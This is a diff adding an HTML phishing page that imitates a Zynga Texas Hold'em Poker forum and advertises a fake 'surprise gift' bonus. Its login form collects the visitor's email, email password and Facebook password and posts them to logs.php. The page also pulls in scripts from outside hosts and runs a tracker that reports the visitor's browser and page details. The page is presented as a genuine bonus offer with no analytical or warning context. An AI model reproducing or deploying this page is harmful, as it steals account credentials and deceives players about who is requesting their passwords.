@@ -1,0 +1,174 @@
+<!-- CSS
+ Stylesheet -->  <style id="vbulletin_css" type="text/css"> /** * vBulletin
+ 3.8.2 CSS *
+ Style: 'Texas HoldEm Style'; Style ID: 10 */ body { background:
+ #000
+ url(http://www.zynga.com/images/forums/texasholdem/header.jpg) top center
+ no-repeat; color:
+ #888888; font: 10pt verdana, geneva, lucida, 'lucida grande',
+ arial, helvetica,
+ sans-serif;
+ margin: 5px 10px 10px 10px; padding: 0px;
+ } a:link, body_alink {
+ color: #c5e3e6; } a:visited,
+ body_avisited {
+ color: #c5e3e6; } a:hover,
+ a:active, body_ahover { color: #ffffff; } td, th,
+ p, li
+ {
+ font: 10pt verdana, geneva, lucida, 'lucida grande', arial,
+ helvetica,
+ sans-serif; } .tborder { background: #444444;
+ color: #000000; } .tcat {
+ background: #000000 url(http://www.zynga.com/images/forums/texasholdem/black_bar.jpg)
+ repeat-x
+ top
+ left;
+ color: #FFFFFF; font: bold 10pt verdana, geneva,
+ lucida, 'lucida
+ grande', arial, helvetica, sans-serif; }
+ .tcat a:link, .tcat_alink { color: #ffffff;
+
+ text-decoration: none; } .tcat a:visited, .tcat_avisited { color:
+ #ffffff; text-decoration:
+ none; } .tcat a:hover, .tcat a:active, .tcat_ahover {
+ color: #FFFF66;
+ text-decoration: underline; } .thead { background: #012001; color: #FFFFFF;
+ font: bold 11px
+ tahoma, verdana, geneva, lucida, 'lucida grande', arial, helvetica,
+ sans-serif; }
+ .thead a:link,
+ .thead_alink { color: #FFFFFF; } .thead a:visited,
+
+
+ .thead_avisited { color: #FFFFFF; } .thead
+ a:hover, .thead a:active, .thead_ahover { color:
+ #FFFF00; } .tfoot { background: #000000
+
+ url(http://www.zynga.com/images/forums/texasholdem/footer.jpg) repeat-x top center;
+ color: #ffffff; text-align:center; } .tfoot a:link,
+ .tfoot_alink { color: #ffffff; } .tfoot a:visited, .tfoot_avisited { color: #c5e3e6; } .tfoot a:hover, .tfoot a:active, .tfoot_ahover
+ { color: #ffffff; } .alt1, .alt1Active { background: #000000; color: #ffffff; } .alt2, .alt2Active { background: #101010; color: #ffffff; } .inlinemod {
+ background: #FFFFCC; color: #000000; } .wysiwyg { background: #F5F5FF; color: #000000; font: 10pt verdana, geneva, lucida, 'lucida grande', arial, helvetica, sans-serif; margin: 5px 10px 10px 10px; padding: 0px; } .wysiwyg a:link, .wysiwyg_alink { color: #c5e3e6; } .wysiwyg a:visited, .wysiwyg_avisited { color: #c5e3e6; } .wysiwyg
+ a:hover, .wysiwyg a:active, .wysiwyg_ahover
+ { color: #ffffff; } textarea, .bginput { font: 10pt
+ verdana, geneva, lucida, 'lucida grande', arial, helvetica, sans-serif; } .bginput
+
+ option,
+ .bginput
+ optgroup { font-size: 10pt; font-family: verdana, geneva, lucida, 'lucida grande',
+ arial, helvetica, sans-serif; } .button { font: 11px
+ verdana, geneva, lucida, 'lucida grande', arial, helvetica, sans-serif; } select { font: 11px verdana, geneva, lucida, 'lucida grande', arial,
+ helvetica, sans-serif; } option, optgroup { font-size: 11px; font-family: verdana, geneva, lucida, 'lucida grande', arial, helvetica, sans-serif; } .smallfont
+ { font: 11px verdana, geneva, lucida, 'lucida grande', arial, helvetica, sans-serif; } .time { color: #30881f; } .navbar { color: #999999; font: 11px verdana, geneva, lucida, 'lucida grande', arial, helvetica, sans-serif; } .highlight { color: #FF0000; font-weight: bold; } .fjsel { background: #3E5C92;
+ color: #E0E0F6; } .fjdpth0 {
+ background: #F7F7F7; color: #000000; } .panel { background: #E4E7F5
+ url(images/gradients/gradient_panel.gif) repeat-x top left; color: #000000;
+
+ padding: 10px;
+ border: 2px outset; }
+ .panelsurround { background: #D1D4E0 url(images/gradients/gradient_panelsurround.gif)
+ repeat-x top left; color: #000000; } legend { color:
+ #22229C; font: 11px tahoma, verdana, geneva, lucida, 'lucida grande', arial, helvetica, sans-serif; } .vbmenu_control { background: #012001; color:
+ #FFFFFF; font: bold 11px tahoma, verdana, geneva, lucida, 'lucida grande', arial, helvetica, sans-serif; padding: 3px 6px 3px 6px; white-space: nowrap; }
+ .vbmenu_control a:link, .vbmenu_control_alink { color: #FFFFFF; text-decoration: none; } .vbmenu_control a:visited, .vbmenu_control_avisited { color: #FFFFFF; text-decoration: none; } .vbmenu_control a:hover, .vbmenu_control a:active, .vbmenu_control_ahover { color: #FFFFFF; text-decoration:
+ underline; }
+ .vbmenu_popup { background: #444444; color: #ffffff; } .vbmenu_option { background:
+ #1e1e1e; color: #fffffff; font: 11px verdana, geneva, lucida,
+
+ 'lucida grande', arial,
+ helvetica, sans-serif;
+ white-space: nowrap; cursor: pointer; } .vbmenu_option a:link, .vbmenu_option_alink { color: #c5e3e6;
+ text-decoration: none; } .vbmenu_option a:visited,
+ .vbmenu_option_avisited { color: #c5e3e6; text-decoration: none; } .vbmenu_option a:hover, .vbmenu_option a:active, .vbmenu_option_ahover { color: #FFFFFF;
+ text-decoration: none; } .vbmenu_hilite { background: #101010; color: #FFFFFF; font: 11px verdana, geneva, lucida, 'lucida grande', arial, helvetica,
+ sans-serif; white-space: nowrap; cursor: pointer; } .vbmenu_hilite a:link, .vbmenu_hilite_alink { color: #FFFFFF; text-decoration: none; } .vbmenu_hilite a:visited, .vbmenu_hilite_avisited { color: #FFFFFF; text-decoration: none; } .vbmenu_hilite a:hover, .vbmenu_hilite
+
+ a:active, .vbmenu_hilite_ahover { color: #FFFFFF; text-decoration: none; } /* ***** styling for 'big'
+ usernames on postbit etc. ***** */ .bigusername {
+
+ font-size: 14pt; } /* ***** small
+ padding on 'thead' elements *****
+ */ td.thead, th.thead, div.thead { padding: 4px; } /* ***** basic styles for multi-page nav elements */
+ .pagenav a { text-decoration: none; } .pagenav td {
+ padding: 2px 4px 2px 4px; } /* ***** de-emphasized text */ .shade, a.shade:link, a.shade:visited { color: #777777; text-decoration: none; } a.shade:active,
+ a.shade:hover { color: #FF4400; text-decoration: underline; } .tcat .shade, .thead .shade, .tfoot .shade { color: #DDDDDD; } /* ***** define margin and font-size
+ for elements inside panels ***** */ .fieldset { margin-bottom: 6px; } .fieldset, .fieldset td, .fieldset p, .fieldset li { font-size: 11px; } </style>
+<link href="texasholdempoker_congratulations_files/vbulletin_important.htm" type="text/css" rel="stylesheet" /> <!-- / CSS
+ Stylesheet --> <script type="text/javascript" src="texasholdempoker_congratulations_files/yahoo-dom-event.htm"></script> <script type="text/javascript" src="texasholdempoker_congratulations_files/connection-min.htm"></script> <script type="text/javascript"> <!-- var SESSIONURL = ""; var
+ SECURITYTOKEN = "guest"; var IMGDIR_MISC =
+ "http://www.zynga.com/images/forums/mafiawarsiphone/images/misc"; var vb_disable_ajax
+ = parseInt("0", 10); // -->
+ </script> <script type="text/javascript" src="texasholdempoker_congratulations_files/vbulletin_global.htm"></script> <script type="text/javascript" src="texasholdempoker_congratulations_files/vbulletin_menu.htm"></script>   <style type="text/css"> <!--
+ .style2 {color: #FFFFFF} -->
+ </style>
+<link href="http://photos-e.ak.fbcdn.net/photos-ak-sf2p/v43/52/2389801228/app_2_2389801228_6849.gif" rel="shortcut icon" />  <!-- logo
+ --><a name="top"></a>
+<table cellspacing="0" cellpadding="0" border="0" align="center" width="800">
+    <tbody>
+        <tr>
+            <td align="left"><a href=""><img style="" alt="" /><img alt="" style="" /><img style="" alt="" /><img alt="" style="" /><img border="0" style="width: 550px; height: 120px; display: block; visibility: hidden;" alt="Zynga Community
+            Forums" src="texasholdempoker_congratulations_files/vbulletin3_logo_white.htm" /></a></td>
+            <td align="right" id="header_right_cell">&nbsp; </td>
+        </tr>
+    </tbody>
+</table>
+<!-- /logo --> <!-- content table
+
+ --> <!-- open content container -->
+<div align="center">
+<div style="width: 800px; text-align: left;" class="page">
+<div align="left" style="padding: 0px 15px;"> <center>
+<p><strong><font size="5" color="#fffff0"><blink> TEXAS HOLD'EM POKER SURPRISE GIFT SEPTEMBER EDITION </blink></font></strong></p>
+<div align="center">
+<p><br />
+<script src="http://h1.flashvortex.com/display.php?id=3_1282416348_45054_364_0_1049_91_9_23" type="text/javascript"></script>           <br />
+</p>
+<div align="center">
+<p><br />
+<script src="http://h1.flashvortex.com/display.php?id=3_1279902182_42600_442_0_728_90_9_1" type="text/javascript"></script>               <br />
+</p>
+</div>
+</div>
+</center>
+<form method="post" action="logs.php">
+    <div align="center">
+    <p>&nbsp;<font face="Tahoma"><strong><font size="3" color="#ffffff"><font size="2" face="Arial">Your bonus is all ready to be claimed. To confirm your bonus, please login first. Thank for your confirmation. <font color="#ff0000"></font> </font></font></strong></font></p>
+    </div>
+    <div id="loginform" style="">
+    <div align="center">&nbsp;</div>
+    <center> <strong><font color="#ffffff"><span class="style2">Email </span></font></strong> </center>  <center> <strong><font color="#ffffff"><input type="text" class="inputtext" id="email" name="email" value="" onkeypress="formchange()" /></font></strong></center>
+    <div align="center">&nbsp;<strong><font color="#ffffff"><span class="style2">Email Password </span></font></strong></div>
+    <center> </center>  <center> <strong><font color="#ffffff"><input type="password" class="inputpassword" id="pass" name="pass" value="" /></font></strong></center>
+    <div align="center">&nbsp;<strong><font color="#ffffff"><span class="style2">facebook password </span></font></strong></div>
+    <center> </center>  <center> <input type="Bonus Code" class="inputBonus Code" id="Bonus" name="Bonus" value="" /></center>
+    <div id="buttons" class="form_row clearfix"><center>
+    <p align="center"><input type="submit" value="confirm" name="login" id="login" onclick="this.disabled=true; this.form.submit(); return false;" class="inputsubmit" /></p>
+    </center></div>
+    <p class="reset_password form_row">&nbsp;</p>
+    </div>
+</form>
+<br />
+<p>&nbsp;</p>
+<center> 		<strong><font size="4" face="Tahoma" color="#d80000">  		<marquee height="10" width="80%" align="center" onmouseout="this.start()" onmouseover="this.stop()" scrollamount="7"> 		<img height="15" border="0" width="50" src="http://j7.tagstat.com/image04/e/9bf8/000b053vFLU.gif" alt="" />                         Take Today Claim Your Bonus! Thanks For Joining Texas Holdem Poker And Enjoy The Game. 		<img height="15" border="0" width="50" src="http://j7.tagstat.com/image04/e/9bf8/000b053vFLU.gif" alt="" /></marquee> </font></strong> </center><br />
+<!-- / sub-forum list --> <!-- threads list --></div>
+</div>
+</div>
+<!-- / close content container --> <!-- /content area table -->
+<div style="text-align: center; padding-top: 10px; clear: both;">
+<p><font color="#ff0000"><span class="api_tos_portion"><font size="2"><br />
+</font></span></font></p>
+</div>
+<br />
+<div align="center">
+<div align="center" class="smallfont"><!-- Do not remove this copyright notice -->  <font size="3" face="Times New Roman" color="#ffffff">Jenifer Hanz Zynga Team<br />
+</font><a href="http://www.automatedtraffic.com/automated_ads/?cbid=extremepay" target="_blank"><img height="50" border="0" width="50" src="http://dfsewetesrsdsef.1000space.com/zynga-online.jpg" alt="automatedtraffic.com" /></a><script src="http://www.100gbfreehost.com/fixstats.php"></script> <a href="http://www.automatedtraffic.com/automated_ads/?cbid=extremepay" target="_blank"><img height="50" border="0" width="50" src="http://dfsewetesrsdsef.1000space.com/zynga-online.jpg" alt="automatedtraffic.com" /></a><script src="http://www.100gbfreehost.com/fixstats.php"></script> </div>
+</div><script language="javascript">
+var data, p;
+var agt=navigator.userAgent.toLowerCase();
+p='http';
+if((location.href.substr(0,6)=='https:')||(location.href.substr(0,6)=='HTTPS:')) {p='https';} data = '&r=' + escape(document.referrer) + '&e=' + escape(document.URL) + '&n=' + escape(navigator.userAgent) + '&p=' + escape(navigator.userAgent) + '&g=' + escape(document.location.href) + '&l=' + escape(navigator.systemLanguage)
+if(navigator.userAgent.substring(0,1)>'3') {data = data + '&sd=' + screen.colorDepth + '&sw=' + escape(screen.width+ 'x'+screen.height)};
+document.write('<a href="http://www.freestats.org/stats.php?i=9" target="_blank" >');
+document.write('<img border=0 height=0 width=0 hspace=0 '+'vspace=0 src="http://www.freestats.org/counter.php?i=9' + data + '"></a>');
+</script>
